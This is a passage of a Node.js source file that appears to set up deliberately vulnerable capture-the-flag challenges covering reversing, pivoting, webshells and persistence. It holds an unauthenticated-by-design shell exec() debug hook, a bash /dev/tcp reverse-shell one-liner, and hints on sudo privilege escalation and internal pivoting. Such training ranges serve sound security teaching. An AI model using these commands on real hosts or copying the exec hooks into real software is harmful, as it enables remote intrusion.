        'For each encoded byte, use __order[position] as the original byte index.',
        'Rotate the encoded byte right by (index % 5) + 1, then xor key(index).',
        'The recovered ASCII token is not the flag. Submit it as ?payload= to unlock a debug hook.',
        'POST the token as an X-Debug-Token header to /reverse/silver/debug with a JSON {"cmd":"..."} body to run real commands.',
        'The debug hook is a real command execution primitive -- use it to open an actual reverse shell.',
        'The user running this service cannot read the flag file directly. Check what it is allowed to run as root without a password.'
      ]
    });
  });

  app.post(`${ctx.mode}/debug`, (req, res) => {
    const token = req.headers['x-debug-token'];
    if (!token || token !== reverseSilverToken()) {
      console.log('[reverse-silver] debug hook rejected: missing or invalid X-Debug-Token');
      return res.status(403).json({ error: 'debug hook locked; solve the reversing challenge first' });
    }
    const cmd = req.body && req.body.cmd;
    if (!cmd || typeof cmd !== 'string') {
      return res.status(400).json({ error: 'cmd (string) is required in the JSON body' });
    }
    console.log(`[reverse-silver] debug hook executing a command (${cmd.length} bytes)`);
    exec(cmd, { shell: '/bin/bash', timeout: 20000, maxBuffer: 4 * 1024 * 1024 }, (error, stdout, stderr) => {
      res.json({
        executed: true,
        exitCode: error ? (typeof error.code === 'number' ? error.code : 1) : 0,
        stdout,
        stderr: stderr || (error && !stdout ? error.message : '')
      });
    });
  });

  app.get(ctx.mode, (req, res) => {
    const p = req.query.payload;
    if (p && p === reverseSilverToken()) {
      console.log('[reverse-silver] solved token accepted; debug hook unlocked');
      lockReverseSilverFlag(ctx);
      return res.json({
        success: true,
        challenge: ctx.mode,
        unlocked: 'debug-hook',
        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON body {"cmd":"<shell command>"} to run real diagnostics on this host. The flag is not returned over HTTP -- it must be read from disk.`,
        evidence: { vector: 'reverse-silver-vm-rce', artifact: `${ctx.mode}/artifact.js` }
      });
    }

    const links = `<div class="result">Artifacts:<br>
      GET <a href="${ctx.mode}/artifact.js">${ctx.mode}/artifact.js</a><br>
      GET <a href="${ctx.mode}/hints">${ctx.mode}/hints</a><br><br>
      Goal: recover the token accepted by the embedded verifier. The flag is not stored in the artifact and is never returned over HTTP.</div>`;
    const feedback = p ? `<div class="result error">Token rejected. Re-check byte order, rotate direction, and xor key schedule.</div>` : '';
    sendPage(res, ctx, form(p || '') + links + feedback, scenario);
  });
}

function registerPivot(app, ctx) {
  const scenario = "An edge diagnostics service exposes a client-side verifier. Recover the token, unlock command execution, pop a real reverse shell, escalate locally to read the pivot key, then use the internal-only relay to catch a second shell and read the final flag.";
  const form = (payload = '') => `<form method="GET"><div class="form-group"><label>Recovered edge token</label><input type="text" name="payload" value="${escapeHtml(payload)}" autocomplete="off"></div><button type="submit">Unlock Edge Diagnostics</button></form>`;
  registerCallbackOnlyEndpoint(app, ctx, 'pivot', () => pivotSilverToken());

  app.get(`${ctx.mode}/artifact.js`, (req, res) => {
    console.log(`[pivot-silver] artifact served to ${req.ip || 'unknown'}`);
    res.type('application/javascript').send(pivotSilverArtifact());
  });

  app.get(`${ctx.mode}/hints`, (req, res) => {
    res.json({
      challenge: ctx.mode,
      hints: [
        'Fetch /pivot/silver/artifact.js and recover the verifier token.',
        'The recovered token unlocks /pivot/silver/debug; it is not the flag.',
        'Use the debug hook to open a real reverse shell from the edge container.',
        'The edge user cannot read pivot artifacts directly. Check sudo privileges.',
        'Read pivot-brief.txt and pivot.key from the edge artifact directory.',
        'The pivot relay is internal-only and must be contacted from the edge host.',
        'Trigger /callback on the relay to receive a second reverse shell and read the final flag there.'
      ]
    });
  });

  app.get(ctx.mode, (req, res) => {
    const p = req.query.payload;
    if (p && p === pivotSilverToken()) {
      console.log('[pivot-silver] solved token accepted; debug hook unlocked');
      lockPivotSilverArtifacts(ctx);
      return res.json({
        success: true,
        challenge: ctx.mode,
        unlocked: 'edge-reverse-shell-callback',
        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read the relay key, then pivot internally for the final flag.`,
        evidence: { vector: 'pivot-silver-reversing-rce-pivot', artifact: `${ctx.mode}/artifact.js` }
      });
    }

    const links = `<div class="result">Artifacts:<br>
      GET <a href="${ctx.mode}/artifact.js">${ctx.mode}/artifact.js</a><br>
      GET <a href="${ctx.mode}/hints">${ctx.mode}/hints</a><br><br>
      Goal: recover the token, unlock the edge debug hook, and pivot through the internal relay. The final flag is never returned over HTTP.</div>`;
    const feedback = p ? `<div class="result error">Token rejected. Re-check byte order, rotate direction, and xor key schedule.</div>` : '';
    sendPage(res, ctx, form(p || '') + links + feedback, scenario);
  });
}

function registerChain(app, ctx) {
  const scenario = "Combined advanced chain. Reverse the client artifact to unlock only a reverse-shell callback, catch the edge shell, escalate locally to recover the relay key, pivot to the internal-only relay, then read the final flag from the relay host.";
  const form = (payload = '') => `<form method="GET"><div class="form-group"><label>Recovered chain token</label><input type="text" name="payload" value="${escapeHtml(payload)}" autocomplete="off"></div><button type="submit">Unlock Edge Callback</button></form>`;

  app.get(`${ctx.mode}/artifact.js`, (req, res) => {
    console.log(`[chain-silver] artifact served to ${req.ip || 'unknown'}`);
    res.type('application/javascript').send(chainSilverArtifact());
  });

  app.get(`${ctx.mode}/hints`, (req, res) => {
    res.json({
      challenge: ctx.mode,
      hints: [
        'Fetch /chain/silver/artifact.js and recover the verifier token.',
        'Submitting the token does not expose command output or the flag.',
        'POST /chain/silver/debug with X-Debug-Token and JSON {"host":"...","port":...}; it only triggers an edge reverse shell callback.',
        'The edge shell lands as ctfuser. The relay key and brief are root-readable only.',
        'Use local sudo/find privilege escalation from the edge shell to read chain-pivot.key and chain-brief.txt.',
        'The relay is internal-only as chain-relay:8081 and must be called from the edge shell.',
        'The relay callback opens the second shell. Read the final flag from that pivot host.'
      ]
    });
  });

  app.post(`${ctx.mode}/debug`, (req, res) => {
    const token = req.headers['x-debug-token'];
    if (!token || token !== chainSilverToken()) {
      console.log('[chain-silver] callback rejected: missing or invalid X-Debug-Token');
      return res.status(403).json({ error: 'edge callback locked; solve the chain artifact first' });
    }

    const host = req.body && (req.body.host || req.body.callback_host);
    const port = callbackPort(req.body && (req.body.port || req.body.callback_port));
    if (!callbackHostOk(host) || !port) {
      return res.status(400).json({ error: 'host and port are required for the reverse shell callback' });
    }

    const command = `setsid bash -lc 'exec bash -i >& /dev/tcp/${host}/${port} 0>&1' </dev/null >/dev/null 2>&1 & disown`;
    console.log(`[chain-silver] triggering edge reverse shell callback to ${host}:${port}`);
    exec(command, { shell: '/bin/sh', timeout: 15000 }, (error) => {
      if (error) console.log(`[chain-silver] edge callback launch failed: ${error.message}`);
    });

    res.json({
      triggered: true,
      callback: { host, port },
      note: 'No command output is returned over HTTP. Continue from the reverse shell session.'
    });
  });

  app.get(ctx.mode, (req, res) => {
    const p = req.query.payload;
    if (p && p === chainSilverToken()) {
      console.log('[chain-silver] solved token accepted; edge callback unlocked');
      lockChainSilverArtifacts(ctx);
      return res.json({
        success: true,
        challenge: ctx.mode,
        unlocked: 'edge-reverse-shell-callback',
        message: `Token accepted. POST ${ctx.mode}/debug with header X-Debug-Token: <token> and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. You must continue from the shell and pivot internally for the flag.`,
        evidence: { vector: 'chain-silver-reversing-revshell-privesc-pivot', artifact: `${ctx.mode}/artifact.js` }
      });
    }

    const links = `<div class="result">Artifacts:<br>
      GET <a href="${ctx.mode}/artifact.js">${ctx.mode}/artifact.js</a><br>
      GET <a href="${ctx.mode}/hints">${ctx.mode}/hints</a><br><br>
      Goal: recover the token, trigger the edge reverse shell, escalate to read the relay key, pivot to the relay, and read the final flag there.</div>`;
    const feedback = p ? `<div class="result error">Token rejected. Re-check the permutation, rotation direction, and key schedule.</div>` : '';
    sendPage(res, ctx, form(p || '') + links + feedback, scenario);
  });
}

function registerWebshell(app, ctx) {
  const scenario = "Assume you bypassed file upload checks and dropped a webshell. Now send an OS command parameter to it.";
  const stageToken = hardStageToken(ctx, 'webshell');
  registerCallbackOnlyEndpoint(app, ctx, 'webshell', () => stageToken);

  app.post(ctx.mode, (req, res) => {
    const code = req.body.code || '';
    const form = `<form method="POST"><div class="form-group"><label>Mock shell.php execution code</label><input type="text" name="code" value="${escapeHtml(code)}"></div><button type="submit">Execute Shell Func</button></form>`;
    if (code.includes('system(')) {
      const artifacts = lockHardPivotArtifacts(ctx, 'webshell');
      return res.json({
        success: true,
        challenge: ctx.mode,
        unlocked: 'edge-reverse-shell-callback',
        stageToken,
        message: `Webshell primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
        evidence: { vector: 'webshell-pivot-chain' }
      });
    }
    sendPage(res, ctx, form + `<div class="result error">Fatal PHP Error: Undefined instruction.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Mock shell.php execution code</label><input type="text" name="code" value="phpinfo()"></div><button type="submit">Execute Shell Func</button></form>`, scenario));
}


function registerPersist(app, ctx) {
  const scenario = "Once root is achieved, attackers usually leave an SSH key or modify cron jobs. Simulate this backdoor mechanism.";
  const stageToken = hardStageToken(ctx, 'persist');
  registerCallbackOnlyEndpoint(app, ctx, 'persist', () => stageToken);

  app.post(ctx.mode, (req, res) => {
    const method = req.body.method || '';
    const form = `<form method="POST"><div class="form-group"><label>Persistence Technique Parameter</label><input type="text" name="method" value="${escapeHtml(method)}"></div><button type="submit">Install Backdoor</button></form>`;
    if (method === 'cron') {
      const artifacts = lockHardPivotArtifacts(ctx, 'persist');
      return res.json({
        success: true,
        challenge: ctx.mode,
        unlocked: 'edge-reverse-shell-callback',
        stageToken,
        message: `Persistence primitive confirmed. POST ${ctx.mode}/debug with X-Stage-Token and JSON {"host":"host.docker.internal","port":LISTENER_PORT}. Continue from the shell, escalate to read ${artifacts.keyPath}, then pivot to ${artifacts.pivotHost}:${artifacts.pivotPort}.`,
        evidence: { vector: 'persist-pivot-chain' }
      });
    }
    sendPage(res, ctx, form + `<div class="result error">Not a recognized persistence mechanism.</div>`, scenario);
  });
  app.get(ctx.mode, (req, res) => sendPage(res, ctx, `<form method="POST"><div class="form-group"><label>Persistence Technique Parameter</label><input type="text" name="method" value="user_add"></div><button type="submit">Install Backdoor</button></form>`, scenario));
}

const CHALLENGE_BUILDERS = {
  '/ssti/silver': registerSsti,
  '/jwt/silver': registerJwt,
  '/mfa/silver': registerMfa,
  '/oauth/silver': registerOauth,
  '/rbac/silver': registerRbac,
  '/csrf/silver': registerCsrf,
  '/postmsg/silver': registerPostmsg,
  '/upload/silver': registerUpload,
  '/xxe/silver': registerXxe,
  '/deser/silver': registerDeser,
  '/ssrf/silver': registerSsrf,
  '/proto/silver': registerProto,
  '/race/silver': registerRace,
  '/payment/silver': registerPayment,
  '/container/silver': registerContainer,
  '/reverse/silver': registerReverse,
  '/pivot/silver': registerPivot,
  '/chain/silver': registerChain,
  '/webshell/silver': registerWebshell,
  '/persist/silver': registerPersist
};

const ISOLATED_CHALLENGE_MODES = Object.freeze(
  Object.keys(CHALLENGE_BUILDERS).sort()
);

function registerIsolatedChallenge(app, mode, options) {
  const builder = CHALLENGE_BUILDERS[mode];
  if (!builder) return false;
  const ctx = createContext(mode);
  const store = createStore();
  builder(app, ctx, store, options.upload);
  app.use((req, res) => res.status(404).send(`Route not found. Valid endpoint is ${mode}`));
  return true;
}

module.exports = {
  registerIsolatedChallenge,
  CHALLENGE_BUILDERS,
  ISOLATED_CHALLENGE_MODES,
};
